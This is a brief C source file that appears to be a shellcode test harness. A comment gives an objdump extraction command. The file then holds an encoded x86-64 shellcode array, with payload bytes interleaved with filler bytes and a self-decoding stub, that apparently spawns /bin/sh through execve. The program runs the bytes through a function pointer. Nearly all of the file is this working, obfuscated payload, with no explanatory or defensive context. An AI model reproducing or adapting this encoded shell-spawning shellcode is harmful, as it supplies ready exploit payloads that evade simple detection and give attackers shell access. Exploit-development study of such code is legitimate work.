// To extract shellcode use the bellow command
// $ for i in $(objdump -d helloworld |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo 


#include <stdio.h>
#include <string.h>


unsigned char code[] = \
"\xeb\x40\xeb\xaa\x10\xaa\x5f\xaa\x57\xaa\x48\xaa\x89\xaa\xe6\xaa\x48\xaa\x31\xaa\xc0\xaa\x50\xaa\x48\xaa\x89\xaa\xe2\xaa\xb0\xaa\x3b\xaa\x0f\xaa\x05\xaa\xe8\xaa\xeb\xaa\xff\xaa\xff\xaa\xff\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x73\xaa\x68\xaa\xbb\xbb\xbb\xbb\x48\x8d\x3d\xb9\xff\xff\xff\x48\x31\xf6\x48\x89\xf1\x48\x83\xc6\x01\x48\x31\xc0\x48\x83\xc0\x02\xb9\x1d\x00\x00\x00\x8a\x1c\x07\x88\x1c\x37\x48\xff\xc6\x48\x83\xc0\x02\xe2\xf1\x88\x4f\x1e\xff\xe7";

int main()
{
	printf("Shellcode length : %d \n", (int )strlen(code));	

	int  (*ret)() = (int (*)())code; 

	ret();
}
